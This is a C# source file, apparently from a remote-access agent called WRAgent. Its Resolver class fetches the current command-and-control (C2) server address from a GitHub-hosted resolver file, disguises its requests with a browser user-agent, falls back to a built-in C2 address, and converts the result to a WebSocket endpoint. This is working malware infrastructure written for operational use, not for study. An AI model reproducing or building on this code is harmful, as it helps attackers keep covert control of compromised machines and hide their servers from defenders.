using System.Net.Http;
using System.Text.Json.Nodes;

namespace WRAgent
{
    internal sealed class Endpoint
    {
        public string Url = "";
        public bool Enabled = true;
    }

    /// <summary>
    /// Pulls the live C2 address from the raw GitHub resolver file.
    /// The binary only needs to be rebuilt when the token changes —
    /// the endpoint can move by editing one text file.
    /// </summary>
    internal static class Resolver
    {
        private static readonly HttpClient Http = new HttpClient { Timeout = TimeSpan.FromSeconds(15) };
        private static readonly object Gate = new();

        private static Endpoint _cached;
        private static DateTime _cachedAt = DateTime.MinValue;
        private static bool _init;

        public static async Task<Endpoint> GetAsync()
        {
            lock (Gate)
            {
                if (_cached != null && (DateTime.UtcNow - _cachedAt).TotalMinutes < 5)
                    return _cached;
            }

            try
            {
                if (!_init)
                {
                    Http.DefaultRequestHeaders.UserAgent.ParseAdd(
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36");
                    _init = true;
                }

                var url = BuildInfo.Resolver;
                var glue = url.Contains('?') ? "&" : "?";
                url += $"{glue}v={DateTimeOffset.UtcNow.ToUnixTimeSeconds()}";

                using var res = await Http.GetAsync(url).ConfigureAwait(false);
                res.EnsureSuccessStatusCode();
                var text = await res.Content.ReadAsStringAsync().ConfigureAwait(false);

                JsonObject node;
                try { node = JsonNode.Parse(text) as JsonObject; }
                catch
                {
                    // tolerate a raw URL in the file
                    var raw = text.Trim();
                    node = new JsonObject { ["c2"] = raw };
                }

                var ep = new Endpoint
                {
                    Url = Normalize(Util.Str(node, "c2", BuildInfo.FallbackC2)),
                    Enabled = Util.Bool(node, "enabled", true)
                };

                lock (Gate) { _cached = ep; _cachedAt = DateTime.UtcNow; }
                return ep;
            }
            catch (Exception e)
            {
                Log.W("resolver: " + e.Message);
                lock (Gate)
                {
                    if (_cached != null) return _cached;
                }
                return new Endpoint { Url = BuildInfo.FallbackC2, Enabled = true };
            }
        }

        private static string Normalize(string s)
        {
            s = (s ?? "").Trim();
            if (s.Length == 0) return BuildInfo.FallbackC2;
            if (s.StartsWith("http://")) s = "ws://" + s.Substring(7);
            else if (s.StartsWith("https://")) s = "wss://" + s.Substring(8);
            if (!s.StartsWith("ws://") && !s.StartsWith("wss://"))
                s = "wss://" + s;
            return s;
        }
    }
}
